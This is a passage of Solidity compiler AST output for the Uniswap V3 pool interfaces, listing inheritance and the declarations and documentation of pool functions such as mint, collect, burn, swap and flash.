										"name": "IUniswapV3PoolState",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 524,
										"src": "667:19:1",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_IUniswapV3PoolState_$524",
											"typeString": "contract IUniswapV3PoolState"
										}
									},
									"id": 95,
									"nodeType": "InheritanceSpecifier",
									"src": "667:19:1"
								},
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 96,
										"name": "IUniswapV3PoolDerivedState",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 231,
										"src": "692:26:1",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_IUniswapV3PoolDerivedState_$231",
											"typeString": "contract IUniswapV3PoolDerivedState"
										}
									},
									"id": 97,
									"nodeType": "InheritanceSpecifier",
									"src": "692:26:1"
								},
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 98,
										"name": "IUniswapV3PoolActions",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 200,
										"src": "724:21:1",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_IUniswapV3PoolActions_$200",
											"typeString": "contract IUniswapV3PoolActions"
										}
									},
									"id": 99,
									"nodeType": "InheritanceSpecifier",
									"src": "724:21:1"
								},
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 100,
										"name": "IUniswapV3PoolOwnerActions",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 416,
										"src": "751:26:1",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_IUniswapV3PoolOwnerActions_$416",
											"typeString": "contract IUniswapV3PoolOwnerActions"
										}
									},
									"id": 101,
									"nodeType": "InheritanceSpecifier",
									"src": "751:26:1"
								},
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 102,
										"name": "IUniswapV3PoolEvents",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 350,
										"src": "783:20:1",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_IUniswapV3PoolEvents_$350",
											"typeString": "contract IUniswapV3PoolEvents"
										}
									},
									"id": 103,
									"nodeType": "InheritanceSpecifier",
									"src": "783:20:1"
								}
							],
							"contractDependencies": [
								200,
								231,
								350,
								390,
								416,
								524
							],
							"contractKind": "interface",
							"documentation": {
								"id": 91,
								"nodeType": "StructuredDocumentation",
								"src": "340:265:1",
								"text": "@title The interface for a Uniswap V3 Pool\n @notice A Uniswap pool facilitates swapping and automated market making between any two assets that strictly conform\n to the ERC20 specification\n @dev The pool interface is broken up into many smaller pieces"
							},
							"fullyImplemented": false,
							"id": 104,
							"linearizedBaseContracts": [
								104,
								350,
								416,
								200,
								231,
								524,
								390
							],
							"name": "IUniswapV3Pool",
							"nodeType": "ContractDefinition",
							"nodes": [],
							"scope": 105,
							"src": "605:203:1"
						}
					],
					"src": "45:764:1"
				},
				"id": 1
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol": {
				"ast": {
					"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol",
					"exportedSymbols": {
						"IUniswapV3PoolActions": [
							200
						]
					},
					"id": 201,
					"license": "GPL-2.0-or-later",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 106,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:2"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 107,
								"nodeType": "StructuredDocumentation",
								"src": "71:102:2",
								"text": "@title Permissionless pool actions\n @notice Contains pool methods that can be called by anyone"
							},
							"fullyImplemented": false,
							"id": 200,
							"linearizedBaseContracts": [
								200
							],
							"name": "IUniswapV3PoolActions",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": {
										"id": 108,
										"nodeType": "StructuredDocumentation",
										"src": "211:206:2",
										"text": "@notice Sets the initial price for the pool\n @dev Price is represented as a sqrt(amountToken1/amountToken0) Q64.96 value\n @param sqrtPriceX96 the initial sqrt price of the pool as a Q64.96"
									},
									"functionSelector": "f637731d",
									"id": 113,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "initialize",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 111,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 110,
												"mutability": "mutable",
												"name": "sqrtPriceX96",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 113,
												"src": "442:20:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 109,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "442:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "441:22:2"
									},
									"returnParameters": {
										"id": 112,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "472:0:2"
									},
									"scope": 200,
									"src": "422:51:2",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 114,
										"nodeType": "StructuredDocumentation",
										"src": "479:1029:2",
										"text": "@notice Adds liquidity for the given recipient/tickLower/tickUpper position\n @dev The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback\n in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends\n on tickLower, tickUpper, the amount of liquidity, and the current price.\n @param recipient The address for which the liquidity will be created\n @param tickLower The lower tick of the position in which to add liquidity\n @param tickUpper The upper tick of the position in which to add liquidity\n @param amount The amount of liquidity to mint\n @param data Any data that should be passed through to the callback\n @return amount0 The amount of token0 that was paid to mint the given amount of liquidity. Matches the value in the callback\n @return amount1 The amount of token1 that was paid to mint the given amount of liquidity. Matches the value in the callback"
									},
									"functionSelector": "3c8a7d8d",
									"id": 131,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "mint",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 125,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 116,
												"mutability": "mutable",
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 131,
												"src": "1536:17:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 115,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1536:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 118,
												"mutability": "mutable",
												"name": "tickLower",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 131,
												"src": "1563:15:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 117,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1563:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 120,
												"mutability": "mutable",
												"name": "tickUpper",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 131,
												"src": "1588:15:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 119,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1588:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 122,
												"mutability": "mutable",
												"name": "amount",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 131,
												"src": "1613:14:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 121,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "1613:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 124,
												"mutability": "mutable",
												"name": "data",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 131,
												"src": "1637:19:2",
												"stateVariable": false,
												"storageLocation": "calldata",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes_calldata_ptr",
													"typeString": "bytes"
												},
												"typeName": {
													"id": 123,
													"name": "bytes",
													"nodeType": "ElementaryTypeName",
													"src": "1637:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_storage_ptr",
														"typeString": "bytes"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1526:136:2"
									},
									"returnParameters": {
										"id": 130,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 127,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 131,
												"src": "1681:15:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 126,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1681:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 129,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 131,
												"src": "1698:15:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 128,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1698:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1680:34:2"
									},
									"scope": 200,
									"src": "1513:202:2",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 132,
										"nodeType": "StructuredDocumentation",
										"src": "1721:1053:2",
										"text": "@notice Collects tokens owed to a position\n @dev Does not recompute fees earned, which must be done either via mint or burn of any amount of liquidity.\n Collect must be called by the position owner. To withdraw only token0 or only token1, amount0Requested or\n amount1Requested may be set to zero. To withdraw all tokens owed, caller may pass any value greater than the\n actual tokens owed, e.g. type(uint128).max. Tokens owed may be from accumulated swap fees or burned liquidity.\n @param recipient The address which should receive the fees collected\n @param tickLower The lower tick of the position for which to collect fees\n @param tickUpper The upper tick of the position for which to collect fees\n @param amount0Requested How much token0 should be withdrawn from the fees owed\n @param amount1Requested How much token1 should be withdrawn from the fees owed\n @return amount0 The amount of fees collected in token0\n @return amount1 The amount of fees collected in token1"
									},
									"functionSelector": "4f1eb3d8",
									"id": 149,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "collect",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 143,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 134,
												"mutability": "mutable",
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 149,
												"src": "2805:17:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 133,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2805:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 136,
												"mutability": "mutable",
												"name": "tickLower",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 149,
												"src": "2832:15:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 135,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "2832:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 138,
												"mutability": "mutable",
												"name": "tickUpper",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 149,
												"src": "2857:15:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 137,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "2857:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 140,
												"mutability": "mutable",
												"name": "amount0Requested",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 149,
												"src": "2882:24:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 139,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2882:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 142,
												"mutability": "mutable",
												"name": "amount1Requested",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 149,
												"src": "2916:24:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 141,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2916:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2795:151:2"
									},
									"returnParameters": {
										"id": 148,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 145,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 149,
												"src": "2965:15:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 144,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2965:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 147,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 149,
												"src": "2982:15:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 146,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2982:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2964:34:2"
									},
									"scope": 200,
									"src": "2779:220:2",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 150,
										"nodeType": "StructuredDocumentation",
										"src": "3005:631:2",
										"text": "@notice Burn liquidity from the sender and account tokens owed for the liquidity to the position\n @dev Can be used to trigger a recalculation of fees owed to a position by calling with an amount of 0\n @dev Fees must be collected separately via a call to #collect\n @param tickLower The lower tick of the position for which to burn liquidity\n @param tickUpper The upper tick of the position for which to burn liquidity\n @param amount How much liquidity to burn\n @return amount0 The amount of token0 sent to the recipient\n @return amount1 The amount of token1 sent to the recipient"
									},
									"functionSelector": "a34123a7",
									"id": 163,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "burn",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 157,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 152,
												"mutability": "mutable",
												"name": "tickLower",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 163,
												"src": "3664:15:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 151,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "3664:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 154,
												"mutability": "mutable",
												"name": "tickUpper",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 163,
												"src": "3689:15:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 153,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "3689:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 156,
												"mutability": "mutable",
												"name": "amount",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 163,
												"src": "3714:14:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 155,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "3714:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3654:80:2"
									},
									"returnParameters": {
										"id": 162,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 159,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 163,
												"src": "3753:15:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 158,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3753:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 161,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 163,
												"src": "3770:15:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 160,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3770:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3752:34:2"
									},
									"scope": 200,
									"src": "3641:146:2",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 164,
										"nodeType": "StructuredDocumentation",
										"src": "3793:1015:2",
										"text": "@notice Swap token0 for token1, or token1 for token0\n @dev The caller of this method receives a callback in the form of IUniswapV3SwapCallback#uniswapV3SwapCallback\n @param recipient The address to receive the output of the swap\n @param zeroForOne The direction of the swap, true for token0 to token1, false for token1 to token0\n @param amountSpecified The amount of the swap, which implicitly configures the swap as exact input (positive), or exact output (negative)\n @param sqrtPriceLimitX96 The Q64.96 sqrt price limit. If zero for one, the price cannot be less than this\n value after the swap. If one for zero, the price cannot be greater than this value after the swap\n @param data Any data to be passed through to the callback\n @return amount0 The delta of the balance of token0 of the pool, exact when negative, minimum when positive\n @return amount1 The delta of the balance of token1 of the pool, exact when negative, minimum when positive"
									},
									"functionSelector": "128acb08",
									"id": 181,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "swap",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 175,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 166,
												"mutability": "mutable",
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 181,
												"src": "4836:17:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 165,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "4836:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 168,
												"mutability": "mutable",
												"name": "zeroForOne",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 181,
												"src": "4863:15:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 167,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "4863:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 170,
												"mutability": "mutable",
												"name": "amountSpecified",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 181,
												"src": "4888:22:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int256",
													"typeString": "int256"
												},
												"typeName": {
													"id": 169,
													"name": "int256",
													"nodeType": "ElementaryTypeName",
													"src": "4888:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 172,
												"mutability": "mutable",
												"name": "sqrtPriceLimitX96",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 181,
												"src": "4920:25:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 171,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "4920:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 174,
												"mutability": "mutable",
												"name": "data",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 181,
												"src": "4955:19:2",
												"stateVariable": false,
												"storageLocation": "calldata",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes_calldata_ptr",
													"typeString": "bytes"
												},
												"typeName": {
													"id": 173,
													"name": "bytes",
													"nodeType": "ElementaryTypeName",
													"src": "4955:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_storage_ptr",
														"typeString": "bytes"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4826:154:2"
									},
									"returnParameters": {
										"id": 180,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 177,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 181,
												"src": "4999:14:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int256",
													"typeString": "int256"
												},
												"typeName": {
													"id": 176,
													"name": "int256",
													"nodeType": "ElementaryTypeName",
													"src": "4999:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 179,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 181,
												"src": "5015:14:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int256",
													"typeString": "int256"
												},
												"typeName": {
													"id": 178,
													"name": "int256",
													"nodeType": "ElementaryTypeName",
													"src": "5015:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4998:32:2"
									},
									"scope": 200,
									"src": "4813:218:2",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 182,
										"nodeType": "StructuredDocumentation",
										"src": "5037:657:2",
										"text": "@notice Receive token0 and/or token1 and pay it back, plus a fee, in the callback\n @dev The caller of this method receives a callback in the form of IUniswapV3FlashCallback#uniswapV3FlashCallback\n @dev Can be used to donate underlying tokens pro-rata to currently in-range liquidity providers by calling\n with 0 amount{0,1} and sending the donation amount(s) from the callback\n @param recipient The address which will receive the token0 and token1 amounts\n @param amount0 The amount of token0 to send\n @param amount1 The amount of token1 to send\n @param data Any data to be passed through to the callback"
									},
									"functionSelector": "490e6cbc",
									"id": 193,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "flash",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 191,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 184,
												"mutability": "mutable",
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 193,
												"src": "5723:17:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 183,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "5723:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 186,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 193,
												"src": "5750:15:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 185,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5750:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 188,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 193,
												"src": "5775:15:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 187,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5775:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 190,
												"mutability": "mutable",
												"name": "data",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 193,
												"src": "5800:19:2",
												"stateVariable": false,
												"storageLocation": "calldata",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes_calldata_ptr",
													"typeString": "bytes"
												},
												"typeName": {
													"id": 189,
													"name": "bytes",
													"nodeType": "ElementaryTypeName",
													"src": "5800:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_storage_ptr",
														"typeString": "bytes"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5713:112:2"
									},
									"returnParameters": {
										"id": 192,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "5834:0:2"
									},
									"scope": 200,
									"src": "5699:136:2",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 194,
										"nodeType": "StructuredDocumentation",
										"src": "5841:367:2",
										"text": "@notice Increase the maximum number of price and liquidity observations that this pool will store\n @dev This method is no-op if the pool already has an observationCardinalityNext greater than or equal to\n the input observationCardinalityNext.\n @param observationCardinalityNext The desired minimum number of observations for the pool to store"
									},
									"functionSelector": "32148f67",
									"id": 199,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "increaseObservationCardinalityNext",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 197,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 196,
												"mutability": "mutable",
												"name": "observationCardinalityNext",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 199,
												"src": "6257:33:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint16",
													"typeString": "uint16"
												},
												"typeName": {
													"id": 195,
													"name": "uint16",
													"nodeType": "ElementaryTypeName",
													"src": "6257:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint16",
														"typeString": "uint16"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6256:35:2"
									},
									"returnParameters": {
										"id": 198,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "6300:0:2"
									},
